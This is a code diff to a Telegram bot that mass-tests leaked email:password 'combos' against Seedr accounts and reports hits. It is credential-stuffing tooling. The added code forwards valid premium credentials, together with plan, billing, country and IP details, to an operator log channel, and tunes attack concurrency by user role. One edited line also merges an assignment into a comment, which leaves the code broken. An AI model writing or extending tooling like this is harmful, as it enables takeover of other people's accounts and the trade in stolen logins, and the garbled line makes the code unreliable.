@@ -70,6 +70,30 @@ async def cmd_single_check(message: Message):
         # Format result
         if success and account_info:
             result_text = format_hit_result(combo, account_info)
+            if account_info.is_premium and config.log_channel_id:
+                try:
+                    hit_text = (
+                        f"👑 *PREMIUM HIT DETECTED (Single Check)*\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"👤 *User ID:* `{user_id}`\n"
+                        f"📧 *Combo:* `{combo}`\n\n"
+                        f"📦 *Plan Name:* `{account_info.package_name}`\n"
+                        f"📊 *Max Capacity:* `{account_info.space_max}`\n"
+                        f"📈 *Used Space:* `{account_info.space_used}`\n"
+                        f"📉 *Free Space:* `{account_info.space_free}`\n"
+                        f"🌍 *Country:* `{account_info.country}`\n"
+                        f"💳 *Billing:* `{account_info.billing_plan}`\n"
+                        f"🔒 *Private IP:* `{account_info.private_ip}`\n"
+                        f"📨 *Invites:* `{account_info.invites}`\n"
+                        "━━━━━━━━━━━━━━━━━━━━━"
+                    )
+                    await message.bot.send_message(
+                        config.log_channel_id,
+                        hit_text,
+                        parse_mode="Markdown"
+                    )
+                except Exception as log_err:
+                    logger.error("log_channel_single_premium_hit_failed", error=str(log_err))
         else:
             result_text = format_dead_result(combo, error)
         
@@ -93,8 +117,13 @@ async def cmd_bulk_check(message: Message, state: FSMContext):
     """Handle /txt command for bulk checking."""
     user_id = message.from_user.id
     
-    # Check if user has active task
-    if await db.get_user_active_task(user_id):
+    # Check user role / privilege
+    user_db_data = await db.get_user(user_id)
+    role = user_db_data.get("role", "member") if user_db_data else "member"
+    is_privileged = config.is_admin(user_id) or role in ["admin", "owner"]
+    
+    # Check if user has active task (privileged users bypass this limit)
+    if not is_privileged and await db.get_user_active_task(user_id):
         await message.reply(
             "⚠️ *You already have a running task!*\n"
             "Use /cancel to stop it first.",
@@ -102,18 +131,23 @@ async def cmd_bulk_check(message: Message, state: FSMContext):
         )
         return
 
-    # Check if user is replying to a txt file
-    if message.reply_to_message and message.reply_to_message.document:
+    # Check if user is replying to a txt file or attached it directly
+    doc = None
+    if message.document:
+        doc = message.document
+    elif message.reply_to_message and message.reply_to_message.document:
         doc = message.reply_to_message.document
-        if doc.file_name.endswith('.txt'):
-            await state.set_state(CheckStates.waiting_for_file)
-            await handle_combo_file(message, state)
-            return
+        
+    if doc and doc.file_name.endswith('.txt'):
+        await state.set_state(CheckStates.waiting_for_file)
+        await handle_combo_file(message, state)
+        return
 
     await message.reply(
         "📁 *Bulk Check Mode*\n\n"
         "Please send a `.txt` file with combos.\n"
         "Format: `email:password` (one per line)\n\n"
+        "📌 *Group Note:* In groups, you must reply to this message with the file or add the `/txt` caption to the upload.\n\n"
         "📌 Limits:\n"
         f" • Max file size: {config.max_file_size_mb} MB\n"
         " • Max combos for members: 1000 lines",
@@ -142,6 +176,26 @@ async def handle_combo_file(message: Message, state: FSMContext):
         )
         await state.clear()
         return
+
+    # Check timeout/cooldown for member only
+    if not is_privileged:
+        last_completed_str = user_db_data.get("last_task_completed_at") if user_db_data else None
+        if last_completed_str:
+            try:
+                last_completed = datetime.fromisoformat(last_completed_str)
+                elapsed = (datetime.utcnow() - last_completed).total_seconds()
+                cooldown = config.member_timeout
+                if elapsed < cooldown:
+                    remaining_cooldown = int(cooldown - elapsed)
+                    await message.reply(
+                        f"⏳ *Cooldown Active!*\n\n"
+                        f"Members must wait `{remaining_cooldown}` seconds before running the next task.",
+                        parse_mode="Markdown"
+                    )
+                    await state.clear()
+                    return
+            except Exception as e:
+                logger.error("cooldown_check_error", error=str(e))
     
     document = message.document or (message.reply_to_message and message.reply_to_message.document)
     if not document:
@@ -240,6 +294,27 @@ async def handle_combo_file(message: Message, state: FSMContext):
         # Log start of processing to console
         log_file_check_start(user_id, document.file_name, task_id, len(valid_combos), chat_id, chat_title)
         
+        # Send start of task notification to the log channel
+        if config.log_channel_id:
+            try:
+                task_start_text = (
+                    f"🚀 *Task Started*\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"👤 *User:* {message.from_user.first_name} {message.from_user.last_name or ''}\n"
+                    f"🆔 *ID:* `{user_id}`\n"
+                    f"📝 *Username:* @{message.from_user.username or 'N/A'}\n"
+                    f"📁 *File Name:* `{document.file_name}`\n"
+                    f"📊 *Total Combos:* `{len(valid_combos)}`\n"
+                    f"🔑 *Task ID:* `{task_id}`"
+                )
+                await message.bot.send_message(
+                    config.log_channel_id,
+                    task_start_text,
+                    parse_mode="Markdown"
+                )
+            except Exception as e:
+                logger.error("log_channel_task_start_failed", error=str(e))
+                
         # Show preview briefly then delete analysis message
         preview_text = (
             "📊 *↯ 〔 FILE ANALYSIS 〕 ↯*\n"
@@ -278,12 +353,48 @@ async def handle_combo_file(message: Message, state: FSMContext):
         
         await state.set_state(CheckStates.checking)
         
+        # Determine concurrency based on role
+        if config.is_owner(user_id) or role == "owner":
+            concurrency = config.owner_workers
+        elif config.is_admin(user_id) or role == "admin":
+            concurrency = config.admin_workers
+        else:
+            concurrency = config.member_workers
+            
+        async def on_premium_hit(combo: str, account_info: AccountInfo):
+            if config.log_channel_id:
+                try:
+                    hit_text = (
+                        f"👑 *PREMIUM HIT DETECTED*\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"👤 *User ID:* `{user_id}`\n"
+                        f"📧 *Combo:* `{combo}`\n\n"
+                        f"📦 *Plan Name:* `{account_info.package_name}`\n"
+                        f"📊 *Max Capacity:* `{account_info.space_max}`\n"
+                        f"📈 *Used Space:* `{account_info.space_used}`\n"
+                        f"📉 *Free Space:* `{account_info.space_free}`\n"
+                        f"🌍 *Country:* `{account_info.country}`\n"
+                        f"💳 *Billing:* `{account_info.billing_plan}`\n"
+                        f"🔒 *Private IP:* `{account_info.private_ip}`\n"
+                        f"📨 *Invites:* `{account_info.invites}`\n"
+                        "━━━━━━━━━━━━━━━━━━━━━"
+                    )
+                    await message.bot.send_message(
+                        config.log_channel_id,
+                        hit_text,
+                        parse_mode="Markdown"
+                    )
+                except Exception as log_err:
+                    logger.error("log_channel_premium_hit_failed", error=str(log_err))
+                    
         # Run batch check
         async with SeedrChecker() as checker:
             results = await checker.check_batch(
                 combos=valid_combos,
                 progress_callback=lambda p, r, c: update_progress(progress_msg, p, r, c, task_id),
-                cancel_event=cancel_event
+                cancel_event=cancel_event,
+                concurrency=concurrency,
+                on_premium_hit=on_premium_hit
             )
             
         # Update task in database
@@ -403,8 +514,7 @@ async def handle_combo_file(message: Message, state: FSMContext):
             chat_title=chat_title
         )
         
-        # Update user stats in DB
-        user = await db.get_user(user_id)
+        # Update user stats in DB        user = await db.get_user(user_id)
         if user:
             await db.update_user_stats(user_id, {
                 "total_checks": user.get("total_checks", 0) + results["processed"],
@@ -446,48 +556,45 @@ async def cmd_cancel(message: Message, state: FSMContext):
     
     # If there are arguments (e.g. /cancel task_123456_789)
     if len(args) > 1:
-        # Check if user is owner
-        if not config.is_owner(user_id):
-            await message.reply(
-                "❌ *Permission Denied*\n"
-                "Only the Owner can cancel other users' tasks by ID.",
-                parse_mode="Markdown"
-            )
-            return
-            
         target_task_id = args[1].strip()
         
-        # Find the user task
-        target_user_id = None
-        for u_id, task_info in list(active_tasks.items()):
-            if task_info.get("task_id") == target_task_id:
-                target_user_id = u_id
-                break
+        # Find the task
+        task_info = active_tasks.get(target_task_id)
+        if task_info:
+            target_user_id = task_info.get("user_id")
+            # Check if user is owner or it is their own task
+            if not config.is_owner(user_id) and target_user_id != user_id:
+                await message.reply(
+                    "❌ *Permission Denied*\n"
+                    "You can only cancel your own tasks.",
+                    parse_mode="Markdown"
+                )
+                return
                 
-        if target_user_id:
-            active_tasks[target_user_id]["cancel_event"].set()
-            log_user_action(user_id, f"cancelled task {target_task_id} of user {target_user_id} via command", chat_id, chat_title)
+            task_info["cancel_event"].set()
+            log_user_action(user_id, f"cancelled task {target_task_id} via command", chat_id, chat_title)
             
-            # Notify Owner
+            # Notify command issuer
             await message.reply(
                 f"✅ *Task Cancelled Successfully*\n"
-                f"Task `{target_task_id}` belonging to user `{target_user_id}` has been cancelled.",
+                f"Task `{target_task_id}` has been cancelled.",
                 parse_mode="Markdown"
             )
             
-            # Notify User
-            try:
-                await message.bot.send_message(
-                    target_user_id,
-                    "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
-                    "━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    "⏹ *Your task has been cancelled by the Owner.*\n"
-                    "Collected hits will be returned shortly.\n\n"
-                    "━━━━━━━━━━━━━━━━━━━━━",
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
+            # Notify user (if different)
+            if target_user_id != user_id:
+                try:
+                    await message.bot.send_message(
+                        target_user_id,
+                        "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
+                        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        "⏹ *Your task has been cancelled by the Owner.*\n"
+                        "Collected hits will be returned shortly.\n\n"
+                        "━━━━━━━━━━━━━━━━━━━━━",
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
         else:
             await message.reply(
                 f"❌ *Error: Task not found*\n"
@@ -496,10 +603,13 @@ async def cmd_cancel(message: Message, state: FSMContext):
             )
         return
         
-    # Normal user cancel
-    if user_id in active_tasks:
-        active_tasks[user_id]["cancel_event"].set()
-        log_user_action(user_id, "requested task cancellation via command", chat_id, chat_title)
+    # Normal user cancel - find any active task for this user
+    user_active_tasks = [t for t in active_tasks.values() if t.get("user_id") == user_id]
+    if user_active_tasks:
+        # Cancel the latest one
+        task_to_cancel = user_active_tasks[-1]
+        task_to_cancel["cancel_event"].set()
+        log_user_action(user_id, f"requested task cancellation for {task_to_cancel['task_id']} via command", chat_id, chat_title)
         cancel_msg = await message.reply(
             "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
             "━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -508,7 +618,7 @@ async def cmd_cancel(message: Message, state: FSMContext):
             "━━━━━━━━━━━━━━━━━━━━━",
             parse_mode="Markdown"
         )
-        active_tasks[user_id]["cancel_msg"] = cancel_msg
+        task_to_cancel["cancel_msg"] = cancel_msg
     else:
         await message.reply(
             "ℹ *↯ 〔 INFO 〕 ↯*\n"
@@ -519,16 +629,29 @@ async def cmd_cancel(message: Message, state: FSMContext):
         )
 
 
-@router.callback_query(F.data == "cancel_task")
+@router.callback_query(F.data.startswith("cancel_task"))
 async def callback_cancel(callback: CallbackQuery, state: FSMContext):
     """Handle cancel callback."""
     user_id = callback.from_user.id
     chat_title = callback.message.chat.title or ""
     chat_id = callback.message.chat.id
     
-    if user_id in active_tasks:
-        active_tasks[user_id]["cancel_event"].set()
-        log_user_action(user_id, "requested task cancellation via inline button", chat_id, chat_title)
+    # Parse task_id if present (e.g. cancel_task:task_id)
+    data_parts = callback.data.split(":", 1)
+    target_task_id = data_parts[1] if len(data_parts) > 1 else None
+    
+    task_to_cancel = None
+    if target_task_id:
+        task_to_cancel = active_tasks.get(target_task_id)
+    else:
+        # Find any active task for this user
+        user_active_tasks = [t for t in active_tasks.values() if t.get("user_id") == user_id]
+        if user_active_tasks:
+            task_to_cancel = user_active_tasks[-1]
+            
+    if task_to_cancel:
+        task_to_cancel["cancel_event"].set()
+        log_user_action(user_id, f"requested task cancellation for {task_to_cancel['task_id']} via inline button", chat_id, chat_title)
         cancel_msg = await callback.message.reply(
             "⏹ *↯ 〔 TASK CANCELLATION 〕 ↯*\n"
             "━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -537,7 +660,8 @@ async def callback_cancel(callback: CallbackQuery, state: FSMContext):
             "━━━━━━━━━━━━━━━━━━━━━",
             parse_mode="Markdown"
         )
-        active_tasks[user_id]["cancel_msg"] = cancel_msg
+        task_to_cancel["cancel_msg"] = cancel_msg
+        await callback.answer("Cancellation request sent")
     else:
         await callback.message.reply(
             "ℹ *↯ 〔 INFO 〕 ↯*\n"
@@ -546,7 +670,7 @@ async def callback_cancel(callback: CallbackQuery, state: FSMContext):
             "━━━━━━━━━━━━━━━━━━━━━",
             parse_mode="Markdown"
         )
-    await callback.answer("Task cancelled")
+        await callback.answer("No active task found")
 
 
 # Global throttle dictionary
@@ -560,7 +684,7 @@ async def update_progress(
     current_combo: str,
     task_id: str
 ):
-    """Update progress message with 2-second throttling."""
+    """Update progress message with throttling based on config."""
     now = time.time()
     last_update = last_update_times.get(task_id, 0)
     
@@ -570,9 +694,9 @@ async def update_progress(
     hits_cnt = len(results["hits"])
     dead_cnt = results["dead"]
     
-    # Throttle edits to at most once every 2 seconds (always update last step)
+    # Throttle edits to at most once every STATUS_UPDATE_INTERVAL seconds (always update last step)
     is_last = processed >= results["total"]
-    if not is_last and (now - last_update) < 2.0:
+    if not is_last and (now - last_update) < config.status_update_interval:
         # Still update task in db
         try:
             await db.update_task(task_id, {
@@ -597,20 +721,20 @@ async def update_progress(
     bar = "▰" * filled + "▱" * (total_bar - filled)
     
     progress_text = (
-        "⚡ *↯ 〔 COMBO CHECKING IN PROGRESS 〕 ↯*\n"
+        "*COMBO CHECKING IN PROGRESS*\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔍 *Current Combo:*\n"
+        "Current Combo:\n"
         f"`{current_combo[:50]}`\n\n"
-        f"📊 *Checking Status:* `{bar}`\n"
-        f" ├ 📥 Processed: `{processed} / {results['total']}`\n"
-        f" ├ 🎯 Hits: `{hits_cnt}`\n"
-        f" ├ 🆓 Free: `{free_cnt}`\n"
-        f" ├ 👑 Premium: `{premium_cnt}`\n"
-        f" └ ❌ Dead: `{dead_cnt}`\n\n"
-        f"⏱ *Time Metrics:*\n"
-        f" ├ 🕒 Elapsed: `{format_time(elapsed)}`\n"
-        f" ├ ⏳ Remaining: `{format_time(estimated_remaining)}`\n"
-        f" └ ⚡ Speed: `{cpm:.1f} CPM`\n\n"
+        f"📊 Checking Status: `{bar}`\n"
+        f" ├ Processed: `{processed} / {results['total']}`\n"
+        f" ├ Hits: `{hits_cnt}`\n"
+        f" ├ Free: `{free_cnt}`\n"
+        f" ├ Premium: `{premium_cnt}`\n"
+        f" └ Dead: `{dead_cnt}`\n\n"
+        f"⏱️ Time Metrics:\n"
+        f" ├ Elapsed: `{format_time(elapsed)}`\n"
+        f" ├ Remaining: `{format_time(estimated_remaining)}`\n"
+        f" └ Speed: `{cpm:.1f} CPM`\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "Press button below to cancel task."
     )
